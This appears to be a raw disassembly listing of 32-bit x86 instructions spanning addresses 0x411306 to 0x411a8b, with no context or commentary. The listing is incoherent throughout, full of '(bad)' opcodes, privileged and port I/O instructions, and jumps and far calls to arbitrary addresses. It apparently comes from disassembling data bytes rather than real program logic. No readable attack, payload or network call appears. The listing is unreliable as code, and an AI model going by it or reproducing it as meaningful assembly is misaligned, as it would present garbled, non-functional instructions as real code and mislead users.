  411306:	dec    esi
  411307:	rcl    esp,1
  411309:	pusha  
  41130a:	jmp    0x41133b
  41130c:	add    eax,0x641e88e7
  411311:	(bad)  
  411312:	jae    0x4112d2
  411314:	cmp    edx,DWORD PTR [esi+0x2]
  411317:	xchg   DWORD PTR [ebx],ebx
  411319:	les    ebp,FWORD PTR [edi+0x30]
  41131c:	cld    
  41131d:	repnz (bad) 
  41131f:	mov    cl,0x51
  411321:	add    al,0xd0
  411323:	mov    cl,0xba
  411325:	outs   dx,DWORD PTR ds:[esi]
  411326:	pop    edx
  411327:	call   0xd181478
  41132c:	hlt    
  41132d:	and    bh,bh
  41132f:	sub    BYTE PTR [ecx],ah
  411331:	in     al,0x90
  411333:	pop    ebp
  411334:	jae    0x4113a0
  411336:	lahf   
  411337:	test   bh,cl
  411339:	xchg   esi,eax
  41133a:	cli    
  41133b:	push   0x3c
  41133d:	cwde   
  41133e:	aam    0x9e
  411340:	cwde   
  411341:	rcl    DWORD PTR [edx+0xb],cl
  411344:	out    0x85,al
  411346:	(bad)  
  411348:	inc    ebp
  411349:	sbb    DWORD PTR [ebx-0x2cb33c0a],edx
  41134f:	pop    es
  411350:	hlt    
  411351:	jo     0x41138f
  411353:	cld    
  411354:	fild   WORD PTR [ebp+0x6be7b6bb]
  41135a:	jg     0x41132f
  41135c:	mov    ds:0x21c5966,eax
  411361:	(bad)  
  411362:	pop    ss
  411363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411364:	mov    BYTE PTR [ebx+0x6e],ch
  411367:	cmp    al,0x71
  411369:	jno    0x411385
  41136b:	fs out dx,eax
  41136d:	fsubrp st(6),st
  41136f:	cmp    BYTE PTR [edx-0x6c4499a9],bl
  411375:	dec    esp
  411376:	sbb    edi,edi
  411378:	mov    ch,0x87
  41137a:	frstor [esi-0x1e]
  41137d:	xor    BYTE PTR [ecx],al
  41137f:	loope  0x411322
  411381:	rcr    BYTE PTR [eax-0x69dfe6a4],cl
  411387:	jno    0x411335
  411389:	rcr    BYTE PTR [eax],cl
  41138b:	pop    edx
  41138c:	jnp    0x411373
  41138e:	lea    ebp,[edi]
  411390:	add    al,0x3c
  411392:	add    cl,BYTE PTR [esi+ecx*2-0x21]
  411396:	push   ss
  411397:	mov    ebx,0x23b23b23
  41139c:	push   eax
  41139d:	rcl    DWORD PTR [ecx-0x6d],cl
  4113a0:	cs clc 
  4113a2:	cmp    DWORD PTR [esi],edx
  4113a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113a5:	mov    ebp,0x3fc6bfe
  4113aa:	sti    
  4113ab:	leave  
  4113ac:	and    dh,dl
  4113ae:	inc    esp
  4113af:	imul   edi,DWORD PTR [esi],0xffffff90
  4113b2:	adc    BYTE PTR [edi+0xdaf6c5b],cl
  4113b8:	adc    eax,0x998b5cd5
  4113bd:	pop    ecx
  4113be:	retf   0xa291
  4113c1:	jmp    0x411434
  4113c3:	js     0x411375
  4113c5:	lock mov ebx,0x78896197
  4113cb:	div    bl
  4113cd:	lods   eax,DWORD PTR ds:[esi]
  4113ce:	arpl   sp,ax
  4113d0:	xchg   edx,eax
  4113d1:	(bad)  
  4113d2:	lods   eax,DWORD PTR ds:[esi]
  4113d3:	lds    ecx,FWORD PTR [ebx+eax*2-0x60]
  4113d7:	popf   
  4113d8:	sahf   
  4113d9:	out    dx,al
  4113da:	lods   eax,DWORD PTR ds:[esi]
  4113db:	jl     0x41144a
  4113dd:	dec    ecx
  4113de:	pop    es
  4113df:	rcl    BYTE PTR [ecx-0x3436f3c4],1
  4113e5:	sub    eax,0xd564e797
  4113ea:	pop    es
  4113eb:	sub    al,0x6f
  4113ed:	jae    0x411457
  4113ef:	mov    BYTE PTR [ecx],0xd0
  4113f2:	cmp    al,bl
  4113f4:	dec    edi
  4113f5:	jns    0x41141f
  4113f7:	repz push cs
  4113f9:	fsubr  DWORD PTR [ecx]
  4113fb:	out    0x48,al
  4113fd:	dec    ecx
  4113fe:	pusha  
  4113ff:	fwait
  411400:	add    dl,bl
  411402:	mov    esi,esi
  411404:	jns    0x4113d5
  411406:	or     eax,0xa2ff25b0
  41140b:	or     eax,0x28537368
  411410:	data16 in al,0xe2
  411413:	scas   eax,DWORD PTR es:[edi]
  411414:	pop    edi
  411415:	pop    eax
  411416:	getsec 
  411418:	xchg   ecx,eax
  411419:	ret    0x9669
  41141c:	leave  
  41141d:	xchg   ebx,eax
  41141e:	pop    esp
  41141f:	sub    eax,0x99012e59
  411424:	pushf  
  411425:	test   al,0xe2
  411427:	in     al,0xf4
  411429:	xchg   edx,eax
  41142a:	stc    
  41142b:	pop    edi
  41142c:	sar    BYTE PTR [ebp+0x3584d883],1
  411432:	push   edi
  411433:	adc    dh,BYTE PTR [eax-0x4d3e582f]
  411439:	mov    ch,0x6a
  41143b:	call   0x2bdf:0x2e83a5e4
  411442:	js     0x411465
  411444:	ror    DWORD PTR [eax+0x4d],cl
  411447:	sbb    al,0x3b
  411449:	ss popa 
  41144b:	mov    bl,0x1d
  41144d:	ror    DWORD PTR [edi+eax*2],cl
  411450:	test   eax,0xe9590a38
  411455:	push   eax
  411456:	jb     0x41149d
  411458:	push   edi
  411459:	stc    
  41145a:	cmp    DWORD PTR [ebp+0x46c98683],esi
  411460:	add    DWORD PTR [edi],esp
  411462:	not    DWORD PTR [edi-0x16]
  411465:	cmp    DWORD PTR [bp+di-0x1dd8],esi
  41146a:	fstp   TBYTE PTR [ecx+0x48]
  41146d:	push   edi
  41146e:	stc    
  41146f:	inc    ebx
  411470:	punpckhwd mm7,mm7
  411473:	mov    ds:0xb7188f17,al
  411478:	lods   al,BYTE PTR ds:[esi]
  411479:	ins    BYTE PTR es:[edi],dx
  41147a:	scas   al,BYTE PTR es:[edi]
  41147b:	add    BYTE PTR [edx+0x43f4b0ed],0xb0
  411482:	(bad)  
  411483:	push   ds
  411484:	pusha  
  411485:	and    eax,0x2d71bfcb
  41148a:	imul   ebp,DWORD PTR [eax],0x46
  41148d:	pop    esi
  41148e:	and    al,0x89
  411490:	pop    ecx
  411491:	mov    dh,0xd3
  411493:	outs   dx,DWORD PTR ds:[esi]
  411494:	mov    eax,0x7cfc828c
  411499:	adc    DWORD PTR [ebp-0x5bbf7a1a],esi
  41149f:	into   
  4114a0:	imul   edi,DWORD PTR [ecx+ebp*4],0x3a
  4114a4:	addr16 aas 
  4114a6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a8:	cmp    eax,0xc7db4e77
  4114ad:	ret    
  4114ae:	jno    0x411449
  4114b0:	outs   dx,BYTE PTR ds:[esi]
  4114b1:	ret    0xe8f7
  4114b4:	jl     0x4114d5
  4114b6:	dec    ebx
  4114b7:	push   edx
  4114b8:	test   DWORD PTR [ebx+0x63],edx
  4114bb:	mov    ebp,0x16aac9b5
  4114c0:	pop    eax
  4114c1:	aaa    
  4114c2:	dec    esi
  4114c3:	in     al,0x77
  4114c5:	(bad)  
  4114c6:	stos   BYTE PTR es:[edi],al
  4114c7:	or     edx,ebp
  4114c9:	inc    ebx
  4114ca:	push   ebp
  4114cb:	mov    edi,0x3d428ade
  4114d0:	push   esp
  4114d1:	int3   
  4114d2:	jne    0x411498
  4114d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d5:	xchg   ecx,eax
  4114d6:	fs js  0x411541
  4114d9:	cli    
  4114da:	scas   al,BYTE PTR es:[edi]
  4114db:	jmp    0x2c58e3a9
  4114e0:	ins    DWORD PTR es:[edi],dx
  4114e1:	imul   bh
  4114e3:	(bad)  ds:0x88229c37
  4114e9:	fcmovne st,st(2)
  4114eb:	sbb    BYTE PTR [ebp-0x73353653],ch
  4114f1:	jmp    FWORD PTR [esi]
  4114f3:	xor    BYTE PTR [esi+0x27],0x93
  4114f7:	or     DWORD PTR [ebp-0x7b8098ef],eax
  4114fd:	jmp    0x4114bd
  4114ff:	loopne 0x4114fb
  411501:	imul   edi,DWORD PTR [ebx-0x48],0xec7ef97a
  411508:	cmp    esp,DWORD PTR [ecx-0x63]
  41150b:	mov    ebp,0x25ba17fa
  411510:	xlat   BYTE PTR ds:[ebx]
  411511:	adc    al,0x9b
  411513:	xchg   ebx,eax
  411514:	cld    
  411515:	sbb    BYTE PTR [edi-0x2e],cl
  411518:	enter  0xc6b5,0xa4
  41151c:	pop    eax
  41151d:	cs stc 
  41151f:	out    0xd8,eax
  411521:	sub    BYTE PTR [edx+edx*1+0x570258e],bh
  411528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411529:	xor    BYTE PTR [edi+ecx*8],dl
  41152c:	in     eax,0xe2
  41152e:	mov    edx,DWORD PTR [eax+0x6e]
  411531:	imul   esi,DWORD PTR [ebx-0x4a],0xffffffed
  411535:	inc    ebp
  411536:	stos   DWORD PTR es:[edi],eax
  411537:	test   al,0x37
  411539:	pop    edx
  41153a:	dec    ecx
  41153b:	adc    DWORD PTR [ebx],ecx
  41153d:	inc    ebx
  41153e:	inc    eax
  41153f:	mov    bh,0xd8
  411541:	sti    
  411542:	jnp    0x4114f7
  411544:	cmp    ebx,esi
  411546:	pop    esp
  411547:	xchg   DWORD PTR [ecx+esi*1+0x1c],esp
  41154b:	fidiv  DWORD PTR [esi]
  41154d:	int3   
  41154e:	std    
  41154f:	jo     0x411584
  411551:	sub    ebx,DWORD PTR [ecx+0x1d]
  411554:	(bad)  
  411556:	(bad)  
  411557:	fisub  WORD PTR [esi]
  411559:	gs inc edx
  41155b:	mov    bl,BYTE PTR [esi-0x2d]
  41155e:	push   esi
  41155f:	jle    0x411556
  411561:	inc    ebx
  411562:	push   ds
  411563:	ss jge 0x4114ea
  411566:	cmp    al,0xb4
  411568:	rol    DWORD PTR [ebx-0x6bd6d772],0xc9
  41156f:	adc    eax,0xd3d039a7
  411574:	mov    BYTE PTR [edi],dh
  411576:	inc    eax
  411577:	(bad)  [ebx]
  411579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41157a:	cwde   
  41157b:	shl    BYTE PTR [esi+edi*1],0xe4
  41157f:	sbb    edi,DWORD PTR [esi+0x1a]
  411582:	out    dx,al
  411583:	jecxz  0x41150a
  411585:	(bad)  
  411586:	imul   edi,edx,0xffffff96
  411589:	jns    0x4115f4
  41158b:	enter  0x86e0,0x96
  41158f:	rcr    BYTE PTR [ecx-0x71],0x7f
  411593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411594:	or     ebx,DWORD PTR [esi+ebx*1-0x2beefaa3]
  41159b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41159c:	push   esp
  41159d:	test   BYTE PTR [eax-0x72],dl
  4115a0:	test   BYTE PTR [ebx+0x36],ch
  4115a3:	repnz sbb al,0x34
  4115a6:	pusha  
  4115a7:	ss inc esi
  4115a9:	jae    0x411587
  4115ab:	stos   DWORD PTR es:[edi],eax
  4115ac:	push   edi
  4115ad:	pop    ebx
  4115ae:	mov    esp,0xce3d5764
  4115b3:	mov    ecx,0xbcd0fc25
  4115b8:	jecxz  0x411604
  4115ba:	push   0xffffff85
  4115bc:	mov    dh,0x1f
  4115be:	xor    DWORD PTR [ebp+0xd],ecx
  4115c1:	xor    esp,DWORD PTR [ecx]
  4115c3:	scas   al,BYTE PTR es:[edi]
  4115c4:	xchg   ebp,eax
  4115c5:	push   es
  4115c6:	sbb    DWORD PTR [ecx+0x71],ecx
  4115c9:	push   eax
  4115ca:	mov    dl,0x85
  4115cc:	inc    ebx
  4115cd:	xchg   esp,eax
  4115ce:	adc    al,0xc9
  4115d0:	daa    
  4115d1:	mov    bh,0x4
  4115d3:	cmp    dl,BYTE PTR [ebp-0x59d12dc6]
  4115d9:	pop    eax
  4115da:	push   ds
  4115db:	xlat   BYTE PTR ds:[ebx]
  4115dc:	stos   DWORD PTR es:[edi],eax
  4115dd:	xchg   ecx,eax
  4115de:	daa    
  4115df:	push   eax
  4115e0:	(bad)  
  4115e2:	addr16 (bad) 
  4115e4:	popa   
  4115e5:	mov    eax,ds:0xc3d99dc2
  4115ea:	shr    dh,1
  4115ec:	xchg   DWORD PTR [edi],edi
  4115ee:	data16 sub BYTE PTR [edx],dh
  4115f1:	aas    
  4115f2:	add    ebx,DWORD PTR [ebx]
  4115f4:	mov    esi,0x91abe910
  4115f9:	fwait
  4115fa:	pop    ebp
  4115fb:	js     0x4115d7
  4115fd:	aam    0xe2
  4115ff:	std    
  411600:	mov    dh,0x2d
  411602:	sub    al,0xf9
  411604:	lahf   
  411605:	loopne 0x41161c
  411607:	mov    eax,0x8a5708ee
  41160c:	add    bh,BYTE PTR [ebp+edi*2+0x64]
  411610:	jb     0x41160e
  411612:	in     al,0xe
  411614:	adc    bl,BYTE PTR [ecx-0x80]
  411617:	mov    dl,0x8
  411619:	and    al,0xd7
  41161b:	retf   
  41161c:	pop    edi
  41161d:	xchg   esi,eax
  41161e:	add    eax,0xe8e767f9
  411623:	xchg   esp,eax
  411624:	xchg   esi,eax
  411625:	mov    ah,0xf4
  411627:	mov    eax,0xe2508df6
  41162c:	lods   al,BYTE PTR ds:[esi]
  41162d:	cmp    ebx,DWORD PTR [edx-0x41]
  411630:	adc    cl,0xe0
  411633:	aas    
  411634:	aaa    
  411635:	lock push edi
  411637:	push   esp
  411638:	cs (bad) 
  41163a:	arpl   dx,bp
  41163c:	icebp  
  41163d:	test   DWORD PTR [eax],ecx
  41163f:	xor    esp,DWORD PTR ds:0xcb4bb452
  411645:	addr16 call 0x26f2:0xe5a39b5b
  41164d:	push   esi
  41164e:	pop    ds
  41164f:	push   esp
  411650:	popa   
  411651:	mov    ebp,0x7823c57c
  411656:	jnp    0x41169f
  411658:	push   ebx
  411659:	xchg   BYTE PTR [ebp+0x2d],cl
  41165c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41165d:	mov    esi,0x8b68929a
  411662:	xor    al,0xbf
  411664:	fbstp  TBYTE PTR [ebx-0x49a3dad4]
  41166a:	and    al,al
  41166c:	ja     0x411663
  41166e:	and    ecx,DWORD PTR [eax-0x5d953298]
  411674:	xor    eax,0xaee95233
  411679:	and    bl,BYTE PTR [ebp+0x5bd5ddee]
  41167f:	xchg   cl,ah
  411681:	iret   
  411682:	cmp    al,0x84
  411684:	clc    
  411685:	repz sbb DWORD PTR [edx+0x72],ebx
  411689:	or     al,0xa7
  41168b:	cs popf 
  41168d:	into   
  41168e:	or     BYTE PTR [edx+0x43f4b089],al
  411694:	arpl   WORD PTR [ebp+eiz*8+0xe],bp
  411698:	jno    0x411650
  41169a:	test   al,0xf6
  41169c:	mov    ds:0xa8f87b0f,al
  4116a1:	(bad)  
  4116a2:	sub    eax,0xe8f0e33f
  4116a7:	fmul   QWORD PTR [ecx+ecx*4]
  4116aa:	jnp    0x4116da
  4116ac:	cdq    
  4116ad:	mov    cl,0xa4
  4116af:	and    eax,0x12a6de55
  4116b4:	aas    
  4116b5:	iret   
  4116b6:	xchg   ebx,eax
  4116b7:	loopne 0x411662
  4116b9:	imul   ebp,DWORD PTR [ecx+0x67],0x6f
  4116bd:	cmp    edi,DWORD PTR [ebp+0x37066cdf]
  4116c3:	xchg   ebx,eax
  4116c4:	mov    ?,WORD PTR [edx+ecx*4-0x7583e7c8]
  4116cb:	(bad)  
  4116cc:	jmp    0xaf9a4f5
  4116d1:	dec    edx
  4116d2:	mov    eax,0x7683fc44
  4116d7:	mov    esi,0xdde08bc2
  4116dc:	call   0x7e830e21
  4116e1:	push   esi
  4116e2:	xlat   BYTE PTR ds:[ebx]
  4116e3:	je     0x41175f
  4116e5:	and    bl,BYTE PTR [ebx-0x61]
  4116e8:	or     dl,dh
  4116ea:	aaa    
  4116eb:	clc    
  4116ec:	scas   al,BYTE PTR es:[edi]
  4116ed:	call   0x9dc86f3c
  4116f2:	adc    eax,0x718a50ae
  4116f7:	stos   BYTE PTR es:[edi],al
  4116f8:	ficom  WORD PTR [ebp+0x2a8a630c]
  4116fe:	jbe    0x411758
  411700:	ret    
  411701:	mov    al,ds:0x7a6cdee7
  411706:	sub    BYTE PTR [ebx+0x6f92209b],bh
  41170c:	es cli 
  41170e:	lock pop eax
  411710:	inc    ecx
  411711:	mov    edi,0x9c8f1756
  411716:	cwde   
  411717:	int3   
  411718:	push   esp
  411719:	les    eax,FWORD PTR [edi-0x17]
  41171c:	push   ebx
  41171d:	out    0x4e,al
  41171f:	xor    ah,BYTE PTR [eax-0xbf9a774]
  411725:	mov    ch,0x41
  411727:	in     al,dx
  411728:	jmp    0xbb8e:0x912c1a21
  41172f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411730:	call   0xa831:0x7aeaf336
  411737:	mov    bl,0x37
  411739:	add    DWORD PTR [ebp-0x28cdbb99],ebx
  41173f:	in     eax,0x87
  411741:	aas    
  411742:	xchg   ecx,eax
  411743:	and    BYTE PTR [edx+0x52],dh
  411746:	add    DWORD PTR [edx-0x577ac8ba],0xffffffd3
  41174d:	lea    cx,[eax+0x5abaa3d0]
  411754:	mov    al,0xe9
  411756:	jmp    0xe7bb331c
  41175b:	fidiv  DWORD PTR [ebx+0x44]
  41175e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175f:	jae    0x4117cd
  411761:	imul   eax,DWORD PTR [ebp+0x597b7772],0x12
  411768:	dec    eax
  411769:	xor    eax,0x5255ed0a
  41176e:	sbb    ebx,esi
  411770:	mov    esi,0x2d54dd7d
  411775:	jmp    0x7e510200
  41177a:	into   
  41177b:	test   DWORD PTR [edx+edi*8+0x6b8f29f5],ecx
  411782:	test   al,0x4f
  411784:	xchg   DWORD PTR [eax-0x70],ebp
  411787:	inc    ebp
  411788:	fdivr  DWORD PTR [eax-0x6c]
  41178b:	push   0xffffffc1
  41178d:	retf   
  41178e:	jl     0x4117f9
  411790:	xchg   edx,eax
  411791:	sbb    eax,0xc85becf1
  411796:	and    BYTE PTR [eax],cl
  411798:	mov    edx,0xfb0fdd94
  41179d:	sub    ebx,edi
  41179f:	hlt    
  4117a0:	jbe    0x411735
  4117a2:	(bad)  
  4117a3:	pop    ss
  4117a4:	mov    ds,WORD PTR [ebx+0x71a2f0]
  4117aa:	push   ecx
  4117ab:	(bad)  
  4117ac:	sbb    DWORD PTR [ebx],edx
  4117ae:	mov    esi,?
  4117b0:	into   
  4117b1:	ret    
  4117b2:	xlat   BYTE PTR ds:[ebx]
  4117b3:	mov    bl,0x66
  4117b5:	jge    0x4117f5
  4117b7:	es add eax,0x9726ef53
  4117bd:	adc    BYTE PTR [edi+eiz*8],dl
  4117c0:	adc    eax,DWORD PTR [ebx+esi*8]
  4117c3:	dec    eax
  4117c4:	xchg   DWORD PTR gs:[edi],edi
  4117c7:	or     BYTE PTR [edx],dl
  4117c9:	dec    edi
  4117ca:	cmp    al,0xd4
  4117cc:	pop    esi
  4117cd:	ja     0x41175c
  4117cf:	pop    ebp
  4117d0:	in     eax,dx
  4117d1:	sub    ebx,ebx
  4117d3:	sub    eax,0xb3610f13
  4117d8:	jno    0x411795
  4117da:	push   ecx
  4117db:	test   eax,0x133328e8
  4117e0:	xor    DWORD PTR [edx-0x65],0xd3682be0
  4117e7:	dec    edi
  4117e8:	ins    DWORD PTR es:[edi],dx
  4117e9:	sbb    eax,0x7660fcf6
  4117ee:	fwait
  4117ef:	shr    edi,cl
  4117f1:	xchg   esi,eax
  4117f2:	xchg   edi,eax
  4117f3:	(bad)  
  4117f4:	pop    ebp
  4117f5:	sub    ebp,DWORD PTR [esi+0x5d]
  4117f8:	jne    0x4117cc
  4117fa:	popa   
  4117fb:	(bad)  
  4117fc:	jmp    0x4117d0
  4117fe:	mov    ebp,?
  411800:	cdq    
  411801:	stos   BYTE PTR es:[edi],al
  411802:	adc    dl,ah
  411804:	cmp    DWORD PTR [esp+ecx*4],edi
  411807:	sub    al,0x78
  411809:	leave  
  41180a:	test   esp,ebx
  41180c:	fisub  WORD PTR [ecx+0x35350a58]
  411812:	or     bl,BYTE PTR [ecx-0x313aaad6]
  411818:	inc    ebp
  411819:	dec    esi
  41181a:	cmc    
  41181b:	cs jle 0x4117a3
  41181e:	ins    DWORD PTR es:[edi],dx
  41181f:	jmp    0xf6dfbbb
  411824:	or     DWORD PTR [eax-0x5eacd877],eax
  41182a:	inc    edi
  41182b:	push   ds
  41182c:	out    dx,al
  41182d:	jb     0x411822
  41182f:	sbb    DWORD PTR [eax],0xd128048d
  411835:	jmp    0x33e:0x870da545
  41183c:	jmp    0x411884
  41183e:	int3   
  41183f:	stc    
  411840:	stos   DWORD PTR es:[edi],eax
  411841:	lea    ecx,[ebx-0x474481af]
  411847:	pop    ecx
  411848:	arpl   WORD PTR [eax-0x16],sp
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	mov    eax,ds:0xfaba2504
  411851:	cmp    al,0x80
  411853:	shl    DWORD PTR [edx+0x5b],0xf0
  411857:	sbb    cl,BYTE PTR [esi]
  411859:	jns    0x4118bc
  41185b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41185c:	lods   eax,DWORD PTR ds:[esi]
  41185d:	adc    BYTE PTR [edi],0xb2
  411860:	mov    ecx,0xef97e984
  411865:	into   
  411866:	mov    bh,0xf0
  411868:	mov    al,0x8d
  41186a:	push   edi
  41186b:	jae    0x41183b
  41186d:	rep outs dx,BYTE PTR ds:[esi]
  41186f:	or     eax,0x906d35a6
  411874:	jl     0x4118df
  411876:	sbb    ebx,DWORD PTR [edi-0x1138581c]
  41187c:	or     dh,BYTE PTR [edi-0x2f84234c]
  411882:	cmc    
  411883:	inc    edx
  411884:	fldenv [edx+0x48]
  411887:	jecxz  0x4118db
  411889:	push   es
  41188a:	outs   dx,BYTE PTR ds:[esi]
  41188b:	push   0xffffffcf
  41188d:	out    dx,al
  41188e:	sbb    DWORD PTR [eax+edi*1-0x44],eax
  411892:	into   
  411893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411894:	xlat   BYTE PTR ds:[ebx]
  411895:	and    DWORD PTR [esi],ebx
  411897:	aam    0xe0
  411899:	cmp    al,0x89
  41189b:	xlat   BYTE PTR ds:[ebx]
  41189c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41189d:	stos   DWORD PTR es:[edi],eax
  41189e:	inc    ebx
  41189f:	dec    ebx
  4118a0:	mov    bl,0x73
  4118a2:	jp     0x411895
  4118a4:	mov    al,ds:0x54f439bb
  4118a9:	jae    0x4118ca
  4118ab:	lahf   
  4118ac:	pop    edx
  4118ad:	dec    edx
  4118ae:	movhps xmm6,QWORD PTR [ebp+0x6d85b8a7]
  4118b5:	pop    esi
  4118b6:	mov    esp,DWORD PTR [ebp-0x6506d288]
  4118bc:	adc    BYTE PTR [ebx-0x32c52c40],cl
  4118c2:	in     al,0x81
  4118c4:	(bad)  
  4118c6:	outs   dx,DWORD PTR ds:[esi]
  4118c7:	mov    edi,0x4da08a05
  4118cc:	jl     0x411946
  4118ce:	mov    BYTE PTR [esi],cl
  4118d0:	jnp    0x411892
  4118d2:	jae    0x411947
  4118d4:	and    ch,dh
  4118d6:	loope  0x4118cf
  4118d8:	inc    esi
  4118d9:	and    eax,0x8555cbae
  4118de:	and    edi,DWORD PTR [ecx-0x736b2322]
  4118e4:	shr    DWORD PTR [ebx-0x1],1
  4118e7:	clc    
  4118e8:	mov    cl,0x5e
  4118ea:	jp     0x411961
  4118ec:	xchg   esp,eax
  4118ed:	xchg   edx,eax
  4118ee:	mov    esp,0x6b028575
  4118f3:	sti    
  4118f4:	addr16 inc esp
  4118f6:	(bad)  
  4118f7:	out    dx,eax
  4118f8:	fcomp  DWORD PTR [ebx+0x2bd00f5]
  4118fe:	mov    ds:0x12679b9f,al
  411903:	ret    0x31a1
  411906:	test   al,0xc3
  411908:	add    al,0x77
  41190a:	xchg   ecx,eax
  41190b:	and    BYTE PTR [ebp+0x37da45c2],0x94
  411912:	mov    al,0xf4
  411914:	ror    al,1
  411916:	inc    ecx
  411917:	leave  
  411918:	pop    esp
  411919:	and    ch,BYTE PTR [edi+esi*1-0x377d6ff1]
  411920:	std    
  411921:	push   ds
  411922:	fs sub al,0xc8
  411925:	imul   ebp,DWORD PTR [esp+eax*2],0x6a42ee84
  41192c:	jne    0x41193f
  41192e:	sub    al,0x81
  411930:	test   edi,0xb09a5945
  411936:	inc    edx
  411937:	sti    
  411938:	xor    DWORD PTR [edi+0x4ed97683],edi
  41193e:	ds pop edx
  411940:	dec    ecx
  411941:	stc    
  411942:	sar    DWORD PTR [edi],0x8f
  411945:	lods   al,BYTE PTR ds:[esi]
  411946:	cdq    
  411947:	mov    ds:0x28c2fcd3,eax
  41194c:	pop    es
  41194d:	xor    eax,0x2a600484
  411952:	pop    ebx
  411953:	push   eax
  411954:	ja     0x4119a6
  411956:	iret   
  411957:	pop    ebx
  411958:	je     0x411955
  41195a:	mov    esi,0x8b6fb202
  41195f:	sub    edx,DWORD PTR ds:0xe407413a
  411965:	mov    edx,0x5cd93e1b
  41196a:	lds    ebx,FWORD PTR [ebp-0x79]
  41196d:	mov    ecx,0x50a39577
  411972:	dec    esi
  411973:	stos   DWORD PTR es:[edi],eax
  411974:	shl    cl,cl
  411976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411977:	(bad)  
  411978:	adc    eax,0x2a3e93f3
  41197d:	sub    DWORD PTR [eax+edx*8-0x525522aa],edi
  411984:	and    ch,al
  411986:	xor    al,BYTE PTR [edx-0x4b]
  411989:	scas   eax,DWORD PTR es:[edi]
  41198a:	not    DWORD PTR [ebx]
  41198c:	in     al,0xc6
  41198e:	ror    BYTE PTR [ecx],0x2a
  411991:	mov    dl,0xbc
  411993:	repnz sub eax,DWORD PTR [esi+0x724dd985]
  41199a:	lea    esi,[ecx+eax*1-0x33]
  41199e:	jl     0x411a16
  4119a0:	retf   0xde57
  4119a3:	icebp  
  4119a4:	xchg   esi,eax
  4119a5:	fmul   QWORD PTR [edx+0x31e57311]
  4119ab:	pop    esi
  4119ac:	cs gs out 0x13,eax
  4119b0:	ret    0x5f88
  4119b3:	mov    al,0xd
  4119b5:	clc    
  4119b6:	mov    cl,0x43
  4119b8:	and    al,0xbc
  4119ba:	mov    esi,0x2940ec8a
  4119bf:	lods   al,BYTE PTR ds:[esi]
  4119c0:	xor    edx,edx
  4119c2:	jne    0x4119fa
  4119c4:	out    0x97,al
  4119c6:	mov    cs,ebp
  4119c8:	push   ebx
  4119c9:	fbstp  TBYTE PTR [edx+0x6b]
  4119cc:	and    DWORD PTR [esi+0x7ee5aabd],ecx
  4119d2:	push   es
  4119d3:	inc    edi
  4119d4:	and    BYTE PTR [ecx+0x2d38bb1],0xb8
  4119db:	push   esp
  4119dc:	fnstcw WORD PTR [edx-0x5a]
  4119df:	sub    al,0xbb
  4119e1:	xor    dh,BYTE PTR [ecx]
  4119e3:	in     al,dx
  4119e4:	push   ds
  4119e5:	jnp    0x4119ec
  4119e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e8:	je     0x4119dd
  4119ea:	sub    DWORD PTR [ebp+0x7d],0xaf75cc52
  4119f1:	jmp    0x411a6e
  4119f3:	mov    ds,WORD PTR [eax]
  4119f5:	dec    esp
  4119f6:	not    DWORD PTR [ebx]
  4119f8:	dec    edx
  4119f9:	fsubr  st(7),st
  4119fb:	test   al,0x34
  4119fd:	cmp    BYTE PTR [ebx-0x7a0ce23a],dl
  411a03:	pop    ss
  411a04:	adc    DWORD PTR [edi+0x148771b5],esp
  411a0a:	(bad)  
  411a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a0c:	pop    edx
  411a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a0e:	outs   dx,DWORD PTR ds:[esi]
  411a0f:	or     BYTE PTR [ecx+0x1b2ae166],bl
  411a15:	in     al,dx
  411a16:	(bad)
  411a1a:	jbe    0x4119ee
  411a1c:	dec    ebp
  411a1d:	inc    esi
  411a1e:	test   BYTE PTR [esi-0x4],al
  411a21:	pop    ebp
  411a22:	in     al,dx
  411a23:	pop    ds
  411a24:	push   esi
  411a25:	rcl    DWORD PTR [edx+ebx*4-0x4b],cl
  411a29:	pop    es
  411a2a:	cmp    dh,BYTE PTR [esi+eax*1]
  411a2d:	push   ss
  411a2e:	(bad)  
  411a2f:	push   ecx
  411a30:	pop    es
  411a31:	bound  edi,QWORD PTR [eax]
  411a33:	loopne 0x411a1b
  411a35:	mov    ebx,0x51d62570
  411a3a:	iret   
  411a3b:	push   0x29
  411a3d:	inc    ebp
  411a3e:	inc    ebx
  411a3f:	inc    eax
  411a40:	in     al,dx
  411a41:	mov    esp,0x4c390fbc
  411a46:	push   es
  411a47:	mov    edx,0x4b057b5b
  411a4c:	add    BYTE PTR [edx+eiz*2],cl
  411a4f:	mov    edx,DWORD PTR [ecx+0x12]
  411a52:	mov    edx,ebp
  411a54:	setne  bl
  411a57:	test   BYTE PTR [ebp+0x2e37c1db],bh
  411a5d:	mov    esi,0xdd73391c
  411a62:	outs   dx,BYTE PTR ds:[esi]
  411a63:	cmp    bl,ah
  411a65:	jmp    0x394577e7
  411a6a:	push   ecx
  411a6b:	hlt    
  411a6c:	or     al,0x39
  411a6e:	push   cs
  411a6f:	xor    esi,DWORD PTR [esi+0x513ebbea]
  411a75:	fwait
  411a76:	dec    ecx
  411a77:	(bad)  
  411a78:	or     bh,BYTE PTR [ebp-0x4f]
  411a7b:	ss pop ss
  411a7d:	out    0x29,eax
  411a7f:	fsub   QWORD PTR [eax+0x349544b1]
  411a85:	test   BYTE PTR [edx-0xf],ch
  411a88:	cmp    eax,DWORD PTR [ebx]
  411a8a:	xlat   BYTE PTR ds:[ebx]
  411a8b:	pop    eax
